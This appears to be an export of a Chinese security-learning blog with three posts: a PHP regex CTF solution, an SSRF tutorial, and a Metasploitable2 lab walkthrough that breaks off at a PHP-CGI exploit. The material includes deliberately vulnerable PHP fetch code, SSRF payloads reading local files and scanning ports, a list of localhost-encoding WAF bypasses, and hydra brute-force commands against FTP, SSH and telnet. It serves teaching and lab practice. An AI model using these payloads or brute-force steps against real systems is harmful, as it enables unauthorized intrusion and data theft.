<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/flag.php'</span>; </span><br><span class="line">$IsMatch= preg_match(<span class="string">"/hongya.*ho.*ngya.&#123;4&#125;hongya&#123;3&#125;:\/.\/(.*hongya)/i"</span>, trim($_POST[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IsMatch )&#123;  </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这一题主要就是匹配<code>hongya.*ho.*ngya.{4}hongya{3}:\/.\/(.*hongya)</code>这个正则表达式。</p>
<p>尝试构造payload:</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">hongya.<span class="selector-class">.ho</span>.<span class="selector-class">.ngya</span>...<span class="selector-class">.hongyaaa</span>:/./..hongya</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/12/PHP_Code_Challenge/1589205670232.png" alt="1589205670232"></p>
]]></content>
      <tags>
        <tag>PHP学习</tag>
      </tags>
  </entry>
  <entry>
    <title>SSRF学习</title>
    <url>/2020/04/03/ssrf-study/</url>
    <content><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><a id="more"></a>

<h2 id="什么是ssrf"><a href="#什么是ssrf" class="headerlink" title="什么是ssrf"></a>什么是ssrf</h2><p>SSRF(Server-Side Request Forgery ，服务器端请求伪造)是一种由攻击者构造形成由服务器发起请求的一个安全漏洞，SSRF的主要攻击目标为外网无法访问的内部系统.简单来说SSRF就是将某台服务器作为跳板来访问内网</p>
<h2 id="漏洞产生原理"><a href="#漏洞产生原理" class="headerlink" title="漏洞产生原理"></a>漏洞产生原理</h2><p>SSRF的形成原因是由服务端提供了从其他服务器获取引用数据的功能，而在用户对目标地址可控的情况下，没有对目标地址做过滤和限制，从而导致了漏洞的产生</p>
<p>eg: 操作服务端从指定的url地址获取网页文本内容，加载指定地址的图片等。SSRF利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li>
<li>攻击运行在内网或本地的应用程序（比如溢出）;</li>
<li>对内网web应用进行指纹识别，通过访问默认文件实现;</li>
<li>攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</li>
<li>利用file协议读取本地文件等。</li>
</ol>
<h2 id="出现的场景"><a href="#出现的场景" class="headerlink" title="出现的场景"></a>出现的场景</h2><ol>
<li>能够对外发起网络请求的地方，就可能存在SSRF漏洞</li>
<li>从远程服务器请求资源(Upload from url,Import &amp; Export RSS Feed)</li>
<li>数据库内置功能(Oracle、MongoDB、MSSQL、Postgres、CouchDB)</li>
<li>Webmail收取其他邮箱邮件(POP3、IMAP、SMTP)</li>
<li>文件处理、编码处理、属性信息处理(ffmpeg、ImageMagic、DOCX、PDF、XML)</li>
</ol>
<h1 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h1><h2 id="file-getcontents"><a href="#file-getcontents" class="headerlink" title="file_getcontents"></a>file_getcontents</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123; </span><br><span class="line">    $content = file_get_contents($_POST[<span class="string">'url'</span>]); </span><br><span class="line">    $filename =<span class="string">'./images/'</span>.rand().<span class="string">';img1.jpg'</span>; </span><br><span class="line">    file_put_contents($filename, $content); </span><br><span class="line">    <span class="keyword">echo</span> $_POST[<span class="string">'url'</span>]; </span><br><span class="line">    $img = <span class="string">"&lt;img src="</span><span class="string">".$filename."</span><span class="string">"/&gt;"</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $img;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码使用file_get_contents函数从用户指定的URL获取图片。然后把该图片用一个随机文件名保存在硬盘上，并且展示给用户看 无论你访问什么都会返回一张图片 若是输入为url=<a href="http://127.0.0.1:80将会返回一张图片，而图片的内容即为其本机的80端口起的服务的内容" target="_blank" rel="noopener">http://127.0.0.1:80将会返回一张图片，而图片的内容即为其本机的80端口起的服务的内容</a></p>
<h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="params">($host,$port,$link)</span> </span>&#123; </span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span> (!$fp) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) n"</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        $out = <span class="string">"GET $link HTTP/1.1rn"</span>; </span><br><span class="line">        $out .= <span class="string">"Host: $hostrn"</span>; </span><br><span class="line">        $out .= <span class="string">"Connection: Closernrn"</span>; </span><br><span class="line">        $out .= <span class="string">"rn"</span>; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents=<span class="string">''</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof($fp)) &#123; </span><br><span class="line">            $contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        <span class="keyword">return</span> $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码使用 fsockopen 函数实现获取用户制定 URL 的数据（文件或者 HTML）。这个函数会使用 socket 跟服务器建立 TCP 连接，传输原始数据。</p>
<h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'url'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $link = $_REQUEST[<span class="string">'url'</span>];</span><br><span class="line">    $filename = <span class="string">'./curled/'</span>.time().<span class="string">'.txt'</span>;	<span class="comment">#创建了一个文件</span></span><br><span class="line">    $curlobj = curl_init($link);</span><br><span class="line">    $fp = fopen($filename,<span class="string">"w"</span>);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_FILE, $fp);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_setopt($curlobj, CURLOPT_FOLLOWLOCATION, <span class="keyword">TRUE</span>);</span><br><span class="line">    curl_exec($curlobj);		<span class="comment">#发送请求</span></span><br><span class="line">    curl_close($curlobj);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    $fp = fopen($filename,<span class="string">"r"</span>);</span><br><span class="line">    $result = fread($fp, filesize($filename)); </span><br><span class="line">    fclose($fp);</span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"?url=[url]"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>将以上代码保存成文件[ssrf_curl.php]。<br>该段代码实现了从服务器获取资源的基本功能，提交<br>[?url=<a href="http://www.xxx.com" target="_blank" rel="noopener">http://www.xxx.com</a> ]<br>页面就会载入百xxx首页的资源。<br>同时，获取的资源文件会保存在[./curled]中，并以发起请求时间的unix 时间戳命名。</p>
</blockquote>
<p><img src="/2020/04/03/ssrf-study/1.png" alt></p>
<blockquote>
<p>访问<a href="http://www.baidu.com/robots.txt，读取文件" target="_blank" rel="noopener">http://www.baidu.com/robots.txt，读取文件</a></p>
</blockquote>
<p><img src="/2020/04/03/ssrf-study/2.png" alt></p>
<p>端口扫描</p>
<blockquote>
<p>使用dict://协议    url=dict://116.62.104.172:100</p>
</blockquote>
<p><img src="/2020/04/03/ssrf-study/3.png" alt><br>读取本地文件</p>
<blockquote>
<p>使用file协议      url=file://c:\windows\system32\drivers\etc\hosts</p>
</blockquote>
<p><img src="/2020/04/03/ssrf-study/4.png" alt><br>指纹识别</p>
<blockquote>
<p>​    url=<a href="http://127.0.0.1/phpmyadmin/README" target="_blank" rel="noopener">http://127.0.0.1/phpmyadmin/README</a></p>
</blockquote>
<p><img src="/2020/04/03/ssrf-study/5.png" alt><br>攻击内网应用</p>
<blockquote>
<p>内网的安全通常都很薄弱，溢出、弱口令等一般都是存在的。<br>通过ssrf攻击，可以实现对内网的访问，从而可以攻击内网应用或者本地机器，获得shell，这里的应用包括服务、Web 应用等。<br>仅仅通过get方法可以攻击的web应用有很多，比如struts2命令执行等。</p>
</blockquote>
<h1 id="绕waf"><a href="#绕waf" class="headerlink" title="绕waf"></a>绕waf</h1><blockquote>
<p>攻击本地<br>    1.<a href="http://127.0.0.1:80" target="_blank" rel="noopener">http://127.0.0.1:80</a><br>    2.<a href="http://localhost:22" target="_blank" rel="noopener">http://localhost:22</a><br>利用[::]<br>    http://[::]:80  —&gt; <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a><br>利用@<br>    <a href="http://example.com@127.0.0.1" target="_blank" rel="noopener">http://example.com@127.0.0.1</a><br>利用短地址<br>    <a href="http://suo.im/8qE9" target="_blank" rel="noopener">http://suo.im/8qE9</a>  —&gt;  <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a><br>特殊域名<br>    <a href="http://127.0.0.1.xip.io" target="_blank" rel="noopener">http://127.0.0.1.xip.io</a>   —&gt;  <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a><br>    <a href="http://www.owasp.org.127.0.0.1.xip.io" target="_blank" rel="noopener">http://www.owasp.org.127.0.0.1.xip.io</a>   —&gt;  <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a><br>利用dns解析<br>    //在域名设置记录指向127.0.0.1<br>    <a href="http://ssrf.ur10ser.xyz/" target="_blank" rel="noopener">http://ssrf.ur10ser.xyz/</a><br>利用句号<br>    127。0。0。1  &gt;&gt;&gt;  127.0.0.1(这里并没成功= =)<br>利用进制转换<br>    <a href="http://0163.073751033" target="_blank" rel="noopener">http://0163.073751033</a> 8进制<br>    <a href="http://0x73.0x000EFD21B" target="_blank" rel="noopener">http://0x73.0x000EFD21B</a>  16进制<br>利用302跳转<br>    <a href="http://127.0.0.1.xip.io/" target="_blank" rel="noopener">http://127.0.0.1.xip.io/</a> 会自动跳转到127.0.0.1<br>    还有一些自己写的302也行<br>其他<br>    127.00.1<br> 127.0.01<br> 0.00.0<br> 127.1.0.1<br> 127.10.1<br> 127.1.01<br> 0177.1<br> 0177.0001.0001<br> 0x7f.0x0.0x0.0x1<br> 0177.0000.0000.0001<br> 0177.0001.0000.0001<br> 0x7f.0x1.0x0.0x1<br> 0x7f.0x1.0x1<br> localtest.me</p>
</blockquote>
<h1 id="SSRF-漏洞的挖掘"><a href="#SSRF-漏洞的挖掘" class="headerlink" title="SSRF 漏洞的挖掘"></a>SSRF 漏洞的挖掘</h1><p>对外发起网络请求的地方都可能存在SSRF漏洞，列举图片加载下载，分享页面，在线翻译，未公开的api（从远程服务器请求资源文件处理，编码处理, 属性信息处理等。</p>
<p><img src="/2020/04/03/ssrf-study/6.png" alt></p>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol>
<li>过滤返回信息，验证远程服务器对请求的响应</li>
<li>统一错误信息，避免用户通过错误信息来判断远端服务器的端口状态</li>
<li>限制请求的端口</li>
<li>黑名单内网ip。避免攻击内网</li>
<li>禁止使用不必要的协议。如<code>file:///,gopher://ftp//</code>等等</li>
</ol>
]]></content>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploitable2靶机渗透</title>
    <url>/2020/06/15/Metasploitable2/</url>
    <content><![CDATA[<p><strong>该靶机作用是用来作为MSF攻击用的靶机,是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统</strong></p>
<a id="more"></a>

<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><strong>参考文章：</strong><a href="http://metasploit.lofter.com/post/d9d60_6a924d" target="_blank" rel="noopener">http://metasploit.lofter.com/post/d9d60_6a924d</a></p>
<p>Metasploitable是一个虚拟机文件，从网上下载解压之后就可以直接使用，无需安装。Metasploitable基于Ubuntu<br>Linux，由于基于Ubuntu，用起来十分得心应手。Metasploitbale建立的初衷，其实就是为了测试一下本家的MSF漏洞框架集工具，所以，它的内核是2.6.24，而且一般在Liunx会产生问题的服务、工具或者软件它都集齐了（请看下文…）。版本2添加了更多的漏洞，而且更让人兴奋的是，系统搭载了DVWA、Mutillidae等Web漏洞演练平台。</p>
<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.211</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Metasploitable2/1591752316703.png" alt="1591752316703"></p>
<blockquote>
<p>192.168.211.157</p>
</blockquote>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nmap -A <span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span> -p <span class="number">1</span><span class="number">-65535</span></span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line"><span class="number">21</span>/tcp    open  ftp         vsftpd <span class="number">2.3</span><span class="number">.4</span></span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to <span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds <span class="keyword">is</span> <span class="number">300</span></span><br><span class="line">|      Control connection <span class="keyword">is</span> plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      vsFTPd <span class="number">2.3</span><span class="number">.4</span> - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line"><span class="number">22</span>/tcp    open  ssh         OpenSSH <span class="number">4.7</span>p1 Debian <span class="number">8</span>ubuntu1 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">1024</span> <span class="number">60</span>:<span class="number">0f</span>:cf:e1:c0:<span class="number">5f</span>:<span class="number">6</span>a:<span class="number">74</span>:d6:<span class="number">90</span>:<span class="number">24</span>:fa:c4:d5:<span class="number">6</span>c:cd (DSA)</span><br><span class="line">|_  <span class="number">2048</span> <span class="number">56</span>:<span class="number">56</span>:<span class="number">24</span>:<span class="number">0f</span>:<span class="number">21</span>:<span class="number">1</span>d:de:a7:<span class="number">2</span>b:ae:<span class="number">61</span>:b1:<span class="number">24</span>:<span class="number">3</span>d:e8:f3 (RSA)</span><br><span class="line"><span class="number">23</span>/tcp    open  telnet      Linux telnetd</span><br><span class="line"><span class="number">25</span>/tcp    open  smtp        Postfix smtpd</span><br><span class="line">|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE <span class="number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="number">8</span>BITMIME, DSN, </span><br><span class="line">|_smtp-ntlm-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ssl-date: <span class="number">2020</span><span class="number">-06</span><span class="number">-09</span>T13:<span class="number">27</span>:<span class="number">07</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">4</span>s <span class="keyword">from</span> scanner time.</span><br><span class="line"><span class="number">53</span>/tcp    open  domain      ISC BIND <span class="number">9.4</span><span class="number">.2</span></span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: <span class="number">9.4</span><span class="number">.2</span></span><br><span class="line"><span class="number">80</span>/tcp    open  http        Apache httpd <span class="number">2.2</span><span class="number">.8</span> ((Ubuntu) DAV/<span class="number">2</span>)</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.2</span><span class="number">.8</span> (Ubuntu) DAV/<span class="number">2</span></span><br><span class="line">|_http-title: Metasploitable2 - Linux</span><br><span class="line"><span class="number">111</span>/tcp   open  rpcbind     <span class="number">2</span> (RPC #<span class="number">100000</span>)</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn Samba smbd <span class="number">3.</span>X - <span class="number">4.</span>X (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">445</span>/tcp   open  netbios-ssn Samba smbd <span class="number">3.</span>X - <span class="number">4.</span>X (workgroup: WORKGROUP)</span><br><span class="line"><span class="number">512</span>/tcp   open  exec        netkit-rsh rexecd</span><br><span class="line"><span class="number">513</span>/tcp   open  login       OpenBSD <span class="keyword">or</span> Solaris rlogind</span><br><span class="line"><span class="number">514</span>/tcp   open  tcpwrapped</span><br><span class="line"><span class="number">1099</span>/tcp  open  java-rmi    GNU Classpath grmiregistry</span><br><span class="line"><span class="number">1524</span>/tcp  open  bindshell   Metasploitable root shell</span><br><span class="line"><span class="number">2049</span>/tcp  open  nfs         <span class="number">2</span><span class="number">-4</span> (RPC #<span class="number">100003</span>)</span><br><span class="line"><span class="number">2121</span>/tcp  open  ftp         ProFTPD <span class="number">1.3</span><span class="number">.1</span></span><br><span class="line"><span class="number">3306</span>/tcp  open  mysql       MySQL <span class="number">5.0</span><span class="number">.51</span>a<span class="number">-3</span>ubuntu5</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: <span class="number">10</span></span><br><span class="line">|   Version: <span class="number">5.0</span><span class="number">.51</span>a<span class="number">-3</span>ubuntu5</span><br><span class="line">|   Thread ID: <span class="number">8</span></span><br><span class="line">|   Capabilities flags: <span class="number">43564</span></span><br><span class="line">|   Some Capabilities: LongColumnFlag, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|_  Salt: <span class="symbol">EkjSC2pas@</span>$<span class="symbol">1i@</span>BhiSFB</span><br><span class="line"><span class="number">3632</span>/tcp  open  distccd     distccd v1 ((GNU) <span class="number">4.2</span><span class="number">.4</span> (Ubuntu <span class="number">4.2</span><span class="number">.4</span><span class="number">-1</span>ubuntu4))</span><br><span class="line"><span class="number">5432</span>/tcp  open  postgresql  PostgreSQL DB <span class="number">8.3</span><span class="number">.0</span> - <span class="number">8.3</span><span class="number">.7</span></span><br><span class="line">|_ssl-date: <span class="number">2020</span><span class="number">-06</span><span class="number">-09</span>T13:<span class="number">26</span>:<span class="number">56</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">4</span>s <span class="keyword">from</span> scanner time.</span><br><span class="line"><span class="number">5900</span>/tcp  open  vnc         VNC (protocol <span class="number">3.3</span>)</span><br><span class="line">| vnc-info: </span><br><span class="line">|   Protocol version: <span class="number">3.3</span></span><br><span class="line">|   Security types: </span><br><span class="line">|_    VNC Authentication (<span class="number">2</span>)</span><br><span class="line"><span class="number">6000</span>/tcp  open  X11         (access denied)</span><br><span class="line"><span class="number">6667</span>/tcp  open  irc         UnrealIRCd</span><br><span class="line">| irc-info: </span><br><span class="line">|   users: <span class="number">1</span></span><br><span class="line">|   servers: <span class="number">1</span></span><br><span class="line">|   lusers: <span class="number">1</span></span><br><span class="line">|   lservers: <span class="number">0</span></span><br><span class="line">|   server: irc.Metasploitable.LAN</span><br><span class="line">|   version: Unreal3<span class="number">.2</span><span class="number">.8</span><span class="number">.1</span>. irc.Metasploitable.LAN </span><br><span class="line">|   uptime: <span class="number">0</span> days, <span class="number">0</span>:<span class="number">04</span>:<span class="number">08</span></span><br><span class="line">|   source ident: nmap</span><br><span class="line">|   source host: <span class="number">77221</span>F35<span class="number">.3</span>B88F125.FFFA6D49.IP</span><br><span class="line">|_  error: Closing Link: ljoynhpjb[<span class="number">192.168</span><span class="number">.211</span><span class="number">.151</span>] (Quit: ljoynhpjb)</span><br><span class="line"><span class="number">6697</span>/tcp  open  irc         UnrealIRCd</span><br><span class="line"><span class="number">8009</span>/tcp  open  ajp13       Apache Jserv (Protocol v1<span class="number">.3</span>)</span><br><span class="line">|_ajp-methods: Failed to <span class="keyword">get</span> a valid response <span class="keyword">for</span> the OPTION request</span><br><span class="line"><span class="number">8180</span>/tcp  open  http        Apache Tomcat/Coyote JSP engine <span class="number">1.1</span></span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-server-header: Apache-Coyote/<span class="number">1.1</span></span><br><span class="line">|_http-title: Apache Tomcat/<span class="number">5.5</span></span><br><span class="line"><span class="number">8787</span>/tcp  open  drb         Ruby DRb RMI (Ruby <span class="number">1.8</span>; path /usr/lib/ruby/<span class="number">1.8</span>/drb)</span><br><span class="line"><span class="number">33959</span>/tcp open  java-rmi    GNU Classpath grmiregistry</span><br><span class="line"><span class="number">42344</span>/tcp open  nlockmgr    <span class="number">1</span><span class="number">-4</span> (RPC #<span class="number">100021</span>)</span><br><span class="line"><span class="number">49564</span>/tcp open  status      <span class="number">1</span> (RPC #<span class="number">100024</span>)</span><br><span class="line"><span class="number">58666</span>/tcp open  mountd      <span class="number">1</span><span class="number">-3</span> (RPC #<span class="number">100005</span>)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">8</span>B:<span class="number">76</span>:<span class="number">3</span>D (VMware)</span><br></pre></td></tr></table></figure>

<p>靶机开放了很多端口，逐个进行尝试</p>
<h1 id="常用端口利用总结"><a href="#常用端口利用总结" class="headerlink" title="常用端口利用总结"></a>常用端口利用总结</h1><p><img src="/2020/06/15/Metasploitable2/XIxIpo4.png" alt="img"></p>
<p><img src="/2020/06/15/Metasploitable2/rL3HIip.png" alt="img"></p>
<p><img src="/2020/06/15/Metasploitable2/5lO0VAs.png" alt="img"></p>
<p><img src="/2020/06/15/Metasploitable2/7ohzV4D.png" alt="img"></p>
<h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p><strong>端口说明：21端口主要用于FTP（File Transfer Protocol，文件传输协议）服务，FTP服务主要是为了在两台计算机之间实现文件的上传与下载，一台计算机作为FTP客户端，另一台计算机作为FTP服务器，可以采用匿名（anonymous）登录和授权用户名与密码登录两种方式登录FTP服务器。目前，通过FTP服务来实现文件的传输是互联网上上传、下载文件最主要的方法。另外，还有一个20端口是用于FTP数据传输的默认<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7" target="_blank" rel="noopener">端口号</a>。</strong></p>
<p>该处可以使用hydra进行ftp账号密码爆破</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.157</span> <span class="selector-tag">ftp</span> <span class="selector-tag">-L</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span> <span class="selector-tag">admin</span> <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Metasploitable2/1591761037664.png" alt="1591761037664"></p>
<p>之后登陆</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ftp <span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span> <span class="number">21</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Metasploitable2/1591842916873.png" alt="1591842916873"></p>
<h2 id="22端口"><a href="#22端口" class="headerlink" title="22端口"></a>22端口</h2><p><strong>22端口就是ssh端口，PcAnywhere建立TCP和这一端口的连接可能是为了寻找ssh</strong><br>这里可以通过爆破22端口来进行攻击</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">hydra</span> 192<span class="selector-class">.168</span><span class="selector-class">.211</span><span class="selector-class">.157</span> <span class="selector-tag">ssh</span> <span class="selector-tag">-L</span> <span class="selector-tag">user</span><span class="selector-class">.txt</span>  <span class="selector-tag">-P</span> <span class="selector-tag">password</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Metasploitable2/1591843615410.png" alt="1591843615410"></p>
<p>之后使用ssh登陆</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">ssh <span class="symbol">msfadmin@</span><span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Metasploitable2/1591843699978.png" alt="1591843699978"></p>
<h2 id="23端口"><a href="#23端口" class="headerlink" title="23端口"></a>23端口</h2><p><strong>23端口是telnet的端口。Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。</strong></p>
<p>依旧是使用hydra进行爆破</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hydra <span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span> telnet -L user.txt  -P password.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Metasploitable2/1591846786014.png" alt="1591846786014"></p>
<p><strong>连接</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">telnet <span class="number">192.168</span><span class="number">.211</span><span class="number">.157</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/15/Metasploitable2/1591846965570.png" alt="1591846965570"></p>
<h2 id="25端口"><a href="#25端口" class="headerlink" title="25端口"></a>25端口</h2><p><strong>SMTP是一个相对简单的基于<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E6%9C%AC" target="_blank" rel="noopener">文本</a>的<a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">协议</a>。在其之上指定了一条<a href="https://zh.wikipedia.org/wiki/%E8%A8%8A%E6%81%AF" target="_blank" rel="noopener">消息</a>的一个或多个接收者（在大多数情况下被确认是存在的），然后消息文本会被传输。可以很简单地通过<a href="https://zh.wikipedia.org/wiki/Telnet" target="_blank" rel="noopener">telnet</a>程序来测试一个SMTP服务器。SMTP使用<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">TCP</a>端口25</strong><br>利用方式：</p>
<ol>
<li>爆破：弱口令</li>
<li>未授权访问</li>
</ol>
<p>参考文章：<a href="https://www.sqlsec.com/2017/08/smtp.html" target="_blank" rel="noopener">https://www.sqlsec.com/2017/08/smtp.html</a></p>
<h2 id="53端口"><a href="#53端口" class="headerlink" title="53端口"></a>53端口</h2><p>53端口是DNS域名服务器的通信端口，通常用于域名解析。也是网络中非常关键的服务器之一。这类服务器容易受到攻击。对于此端口的渗透，一般有三种方式。</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">（<span class="number">1</span>）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。（<span class="symbol">https:</span>/<span class="regexp">/www.seebug.org/vuldb</span><span class="regexp">/ssvid-96718）</span></span><br><span class="line"><span class="regexp">（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。（https:/</span><span class="regexp">/baijiahao.baidu.com/s</span>?id=<span class="number">1577362432987749706</span>&amp;wfr=spider&amp;<span class="keyword">for</span>=pc）</span><br><span class="line">（<span class="number">3</span>）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。（<span class="symbol">http:</span>/<span class="regexp">/www.edu.cn/xxh</span><span class="regexp">/fei/zxz</span><span class="regexp">/201503/t</span>20150305_1235269.shtml）（<span class="number">4</span>）DNS劫持。（<span class="symbol">https:</span>/<span class="regexp">/blog.csdn.net/qq</span>_32447301/article/details/<span class="number">77542474</span>）</span><br></pre></td></tr></table></figure>

<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>扫描目录，发现phpmyadmin和phpinfo.php<br><img src="/2020/06/15/Metasploitable2/1591864439751.png" alt="1591864439751"></p>
<p>PHP版本为5.2.4<br>使用PHP-CGI远程任意代码执行漏洞进行攻击</p>
<blockquote>
